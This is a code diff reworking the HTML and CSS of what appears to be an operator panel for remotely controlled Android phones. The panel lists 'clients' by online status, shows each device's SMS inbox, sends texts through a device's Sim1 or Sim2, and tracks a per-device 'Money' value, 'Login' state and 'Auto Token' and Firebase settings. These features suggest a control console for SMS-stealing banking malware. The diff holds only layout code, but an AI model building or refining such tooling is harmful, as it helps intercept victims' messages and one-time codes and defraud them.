@@ -95,9 +95,20 @@ html,body{height:100%;width:100%;font-family:sans-serif;background:var(--main);c
 .search-box{flex:1;height:45px;border-radius:20px;border:1px solid var(--card);background:var(--card);padding:0 14px;font-size:16px;color:var(--black);outline:none}
 .search-box::placeholder{color:var(--hint)}
 .list-wrap{flex:1;min-height:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:12px}
-.apk-extra-btn{display:none}
-body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
-.nya-strict-apk .device-extra-btn{display:none!important}
+
+/* Device detail — activity_main2 (fixed top + SMS list scroll only) */
+#view-device{display:flex;flex-direction:column;height:100%;overflow:hidden;background:var(--main)}
+.device-fixed-top{flex-shrink:0;background:var(--main)}
+.device-sms-scroll{flex:1;min-height:0;overflow-y:auto;-webkit-overflow-scrolling:touch;padding-bottom:12px;background:var(--main)}
+.detail-field{border:1px solid var(--black);border-radius:10px;padding:10px;height:40px;font-size:16px;color:var(--black);background:transparent;outline:none;box-sizing:border-box}
+.detail-field::placeholder{color:#636262}
+.detail-field-wide{display:block;width:100%;max-width:290px;margin:8px auto 0}
+.detail-money-row{display:flex;align-items:center;justify-content:center;gap:4px;padding:0 16px;margin-top:8px}
+.detail-field-money{width:150px;flex:0 0 150px}
+.detail-btn{height:40px;min-width:92px;border:1px solid var(--black);border-radius:10px;background:var(--black);color:var(--main);font-size:14px;font-weight:700;padding:0 12px;cursor:pointer;touch-action:manipulation}
+.detail-sim-row{display:flex;justify-content:center;gap:11px;padding:4px 16px 0;margin:0}
+.detail-sim-btn{width:140px;flex:0 0 140px;height:40px;font-size:14px}
+.detail-search-row{padding-bottom:8px;margin-top:12px}
 
 .dev-card{margin:5px 15px;border-radius:20px;background:var(--card-border);box-shadow:0 8px 24px rgba(0,0,0,.25);overflow:hidden;cursor:pointer;touch-action:manipulation}
 .dev-card-inner{background:var(--card);min-height:150px;padding:8px 12px;display:grid;grid-template-columns:60px 1fr auto;grid-template-rows:auto auto auto auto;gap:4px 10px;position:relative}
@@ -138,7 +149,6 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
 .detail-check{position:absolute;bottom:8px;right:12px;display:flex;align-items:center;gap:4px;font-size:14px;font-weight:800;color:var(--pin)}
 .detail-check input{width:18px;height:18px;accent-color:var(--pin)}
 .detail-paste-row{display:flex;align-items:center;gap:4px;padding:0 16px 12px}
-.detail-paste-row input{flex:1}
 .detail-paste-row .paste-btn{width:40px;height:40px;border:none;background:none;font-size:28px;cursor:pointer;flex-shrink:0}
 
 .sheet-bg{position:fixed;inset:0;background:rgba(0,0,0,.45);z-index:50;opacity:0;pointer-events:none}
@@ -158,7 +168,7 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
 .detail-hdr .title{flex:1;font-size:24px;font-weight:800;text-align:center}
 .detail-hdr .status{font-size:20px;font-weight:800}
 .detail-hdr .status.offline{color:var(--offline)}
-.detail-line{height:2px;background:#a3a3a3;margin:0}
+.detail-line{height:2px;background:#a3a3a3;margin:0;flex-shrink:0}
 .detail-body{padding:16px 24px;color:var(--detail);font-size:16px;font-weight:700;line-height:1.6;white-space:pre-line}
 .detail-actions{padding:0 16px 12px;display:flex;flex-wrap:wrap;gap:8px;align-items:center}
 .detail-actions input,.detail-actions textarea{flex:1;min-width:140px;padding:10px;border:1px solid var(--black);border-radius:8px;font-size:15px}
@@ -193,7 +203,6 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
 .token-btn-row .nya-btn.active{background:var(--online);color:#fff;border-color:var(--online)}
 .token-device-info{margin:0 4px 12px;padding:12px 14px;border-radius:12px;background:#fff;border:1px solid var(--card-border);font-size:14px;font-weight:700;line-height:1.45}
 .token-device-info small{display:block;font-size:12px;font-weight:400;color:var(--muted);margin-top:4px}
-#view-device .detail-line,#view-device .detail-body-wrap,#view-device .detail-paste-row,#view-device .detail-actions,#view-device .sim-row,#view-device .search-row{flex-shrink:0}
 </style>
 </head>
 <body>
@@ -206,9 +215,7 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
     <div class="hdr-row">
       <span class="hdr-spacer"></span>
       <div class="hdr-title" id="totalClients">Total Clients:-</div>
-      <button type="button" class="icon-btn apk-extra-btn" onclick="openAutoTokenSheet()" title="Auto Token">⚡</button>
-      <button type="button" class="icon-btn apk-extra-btn" onclick="openFbSheet()" title="Firebase">🔥</button>
-      <button type="button" class="icon-btn" id="homeRefreshBtn" onclick="refreshData()" title="Refresh">🔄</button>
+      <button type="button" class="icon-btn" onclick="refreshData()" title="Refresh">🔄</button>
     </div>
     <div class="btn-row">
       <button type="button" class="nya-btn" onclick="showPage('liked')">Liked ❤️</button>
@@ -223,6 +230,10 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
       <button type="button" class="nya-btn wide" onclick="showPage('money')">Money 💰</button>
       <button type="button" class="nya-btn" onclick="showPage('login')">Login👨🏻‍💻</button>
       <button type="button" class="nya-btn" onclick="deleteChecked()">Delete🗑️</button>
+    </div>
+    <div class="btn-row">
+      <button type="button" class="nya-btn" onclick="openFbSheet()">Firebase 🔥</button>
+      <button type="button" class="nya-btn" onclick="openAutoTokenSheet()">Auto Token ⚡</button>
     </div>
   </div>
   <div class="list-wrap" id="devList"></div>
@@ -320,40 +331,37 @@ body:not(.nya-strict-apk) .apk-extra-btn{display:flex}
 
 <!-- DEVICE DETAIL activity_main2 -->
 <div id="view-device" class="page">
-  <div class="detail-hdr">
-    <button type="button" class="back" onclick="closeDeviceDetail()">←</button>
-    <div class="title" id="deviceDetailTitle">Device</div>
-    <div class="status offline" id="deviceDetailStatus">Offline</div>
-    <label class="login-switch"><input type="checkbox" id="deviceLoginToggle" onchange="toggleDeviceLogin(this.checked)"/> LOGGED IN</label>
+  <div class="device-fixed-top">
+    <div class="detail-hdr">
+      <button type="button" class="back" onclick="closeDeviceDetail()">←</button>
+      <div class="title" id="deviceDetailTitle">Device</div>
+      <div class="status offline" id="deviceDetailStatus">Offline</div>
+      <label class="login-switch"><input type="checkbox" id="deviceLoginToggle" onchange="toggleDeviceLogin(this.checked)"/> LOGGED IN</label>
+    </div>
+    <div class="detail-line"></div>
+    <div class="detail-body-wrap">
+      <div class="detail-body" id="deviceDetailBody">Loading…</div>
+      <button type="button" class="detail-icon-btn" onclick="copyDevicePhone()" title="Copy">📋</button>
+      <button type="button" class="detail-like" id="deviceLikeBtn" onclick="toggleDeviceDetailLike()">👎</button>
+      <label class="detail-check"><input type="checkbox" id="deviceCheckedBox" onchange="toggleDeviceDetailChecked(this.checked)"/> CHECKED</label>
+    </div>
+    <div class="detail-money-row">
+      <input id="updateMoney" class="detail-field detail-field-money" placeholder="Update Money"/>
+      <button type="button" class="detail-btn" onclick="saveDeviceMoney()">Done</button>
+      <button type="button" class="paste-btn" onclick="pasteDeviceSms()" title="Paste">📥</button>
+    </div>
+    <input id="smsTo" class="detail-field detail-field-wide" placeholder="Enter recipient phone number"/>
+    <input id="smsBody" class="detail-field detail-field-wide" placeholder="Enter SMS body"/>
+    <div class="sim-row detail-sim-row">
+      <button type="button" class="detail-btn detail-sim-btn" onclick="sendDeviceSms(1)">Sim1</button>
+      <button type="button" class="detail-btn detail-sim-btn" onclick="sendDeviceSms(2)">Sim2</button>
+    </div>
+    <div class="search-row detail-search-row">
+      <input class="search-box" id="searchDevice" placeholder="Search clients..." oninput="renderDeviceSmsList()"/>
+      <button type="button" class="icon-btn" onclick="renderDeviceSmsList()">🔍</button>
+    </div>
   </div>
-  <div class="detail-line"></div>
-  <div class="detail-body-wrap">
-    <div class="detail-body" id="deviceDetailBody">Loading…</div>
-    <button type="button" class="detail-icon-btn" onclick="copyDevicePhone()" title="Copy">📋</button>
-    <button type="button" class="detail-like" id="deviceLikeBtn" onclick="toggleDeviceDetailLike()">👎</button>
-    <label class="detail-check"><input type="checkbox" id="deviceCheckedBox" onchange="toggleDeviceDetailChecked(this.checked)"/> CHECKED</label>
-  </div>
-  <div class="detail-paste-row">
-    <input id="updateMoney" placeholder="Update Money"/>
-    <button type="button" class="nya-btn" onclick="saveDeviceMoney()">Done</button>
-    <button type="button" class="paste-btn" onclick="pasteDeviceSms()" title="Paste">📥</button>
-  </div>
-  <div class="detail-actions">
-    <input id="smsTo" placeholder="Enter recipient phone number" style="flex:2"/>
-  </div>
-  <div class="detail-actions">
-    <textarea id="smsBody" rows="2" placeholder="Enter SMS body" style="width:100%"></textarea>
-  </div>
-  <div class="sim-row">
-    <button type="button" class="nya-btn" onclick="sendDeviceSms(1)">Sim1</button>
-    <button type="button" class="nya-btn" onclick="sendDeviceSms(2)">Sim2</button>
-    <button type="button" class="nya-btn device-extra-btn" onclick="setupAutoTokenFromDevice()">⚡ Auto Token</button>
-  </div>
-  <div class="search-row">
-    <input class="search-box" id="searchDevice" placeholder="Search clients..." oninput="renderDeviceSmsList()"/>
-    <button type="button" class="icon-btn" onclick="renderDeviceSmsList()">🔍</button>
-  </div>
-  <div class="list-wrap" id="devListDeviceSms"></div>
+  <div class="list-wrap device-sms-scroll" id="devListDeviceSms"></div>
 </div>
 
 </div>
